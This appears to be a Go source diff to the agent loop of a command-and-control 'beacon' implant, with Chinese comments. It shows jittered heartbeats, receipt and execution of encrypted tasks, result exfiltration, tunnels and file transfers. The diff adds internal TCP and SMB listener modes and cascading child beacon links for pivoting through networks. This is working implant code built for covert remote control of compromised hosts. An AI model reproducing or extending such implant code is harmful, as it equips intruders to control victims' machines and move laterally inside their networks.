@@ -5,9 +5,10 @@ import (
 	"beacon/pkg/command"
 	"beacon/pkg/profile"
 	"beacon/pkg/utils/crypt"
-	transport "beacon/pkg/utils/http"
+	httptransport "beacon/pkg/utils/http"
 	"beacon/pkg/utils/packet"
 	"fmt"
+	"strings"
 	"sync/atomic"
 	"time"
 )
@@ -16,7 +17,7 @@ import (
 // 主循环以心跳驱动：发送心跳 → 接收任务 → 执行 → 回传结果。
 type Agent struct {
 	Ctx     *Context
-	client  *transport.HttpClient
+	client  Transport
 	handler *command.Handler
 	stop    atomic.Bool
 }
@@ -34,7 +35,7 @@ func NewAgent() (*Agent, error) {
 
 	agent := &Agent{
 		Ctx:     ctx,
-		client:  transport.NewHttpClient(),
+		client:  httptransport.NewHttpClient(),
 		handler: handler,
 	}
 	handler.SetResultSink(func(pkt []byte) {
@@ -75,6 +76,26 @@ func (a *Agent) Run() int {
 		a.Ctx.Meta.OS, a.Ctx.Meta.Arch, a.Ctx.Meta.Username, a.Ctx.Meta.InternalIP)
 	fmt.Printf("[*] BeaconID: %d\n", a.Ctx.BeaconID)
 
+	if isInternalProfile() {
+		switch strings.ToLower(profile.GlobalProfile.Protocol) {
+		case "tcp":
+			return a.runInternalTCP()
+		case "smb":
+			return a.runInternalSMB()
+		default:
+			fmt.Printf("[!] Unsupported internal protocol: %s\n", profile.GlobalProfile.Protocol)
+			return -1
+		}
+	}
+
+	return a.runExternal()
+}
+
+func isInternalProfile() bool {
+	return strings.EqualFold(profile.GlobalProfile.ListenerType, "internal")
+}
+
+func (a *Agent) runExternal() int {
 	for a.Ctx.Active() && !a.stop.Load() {
 		// 1. 按配置的 sleep + jitter 等待
 		a.sleep()
@@ -93,7 +114,7 @@ func (a *Agent) Run() int {
 		}
 
 		// 3. 发送心跳，获取服务端返回的加密任务
-		response, err := a.client.SendData(heartbeat, nil)
+		response, err := a.client.Exchange(heartbeat, nil)
 		if err != nil {
 			fmt.Printf("[!] Communication error: %v\n", err)
 			continue
@@ -105,6 +126,7 @@ func (a *Agent) Run() int {
 		// 5. 将传输和隧道的挂起数据包入队
 		a.flushTransfers()
 		a.flushTunnels()
+		a.flushCascade()
 
 		// 6. 逐个加密并发送 Outbox 中的结果
 		a.flushOutbox(heartbeat)
@@ -206,6 +228,10 @@ func (a *Agent) dispatchTasks(encryptedTasks []byte) {
 		}
 
 		if commandID == command.CommandExit {
+			// 退出前同步关闭所有级联子链路并入队 CascadeDead，
+			// 确保当前轮次的 flushCascade + flushOutbox 能把 Dead 通知发给服务端，
+			// 避免服务端路由表残留旧的父 beacon session，导致新父 beacon 接管后命令无效。
+			a.handler.ShutdownCascade()
 			a.Ctx.Stop()
 		}
 	}
@@ -236,6 +262,12 @@ func (a *Agent) flushTunnels() {
 	}
 }
 
+func (a *Agent) flushCascade() {
+	for _, pkt := range a.handler.GetPendingCascadePackets() {
+		a.Ctx.Outbox.Enqueue(pkt)
+	}
+}
+
 // flushOutbox 逐个取出 Outbox 中的结果包，加密后发送给服务端。
 // 发送失败时将未发送的包重新压回队列头部，等待下次心跳重试。
 func (a *Agent) flushOutbox(heartbeat []byte) {
@@ -250,11 +282,13 @@ func (a *Agent) flushOutbox(heartbeat []byte) {
 			return
 		}
 
-		if _, err := a.client.SendData(heartbeat, encrypted); err != nil {
+		response, err := a.client.Exchange(heartbeat, encrypted)
+		if err != nil {
 			cur.next = next
 			a.Ctx.Outbox.PushFrontList(cur)
 			return
 		}
+		a.dispatchTasks(response)
 
 		cur = next
 	}
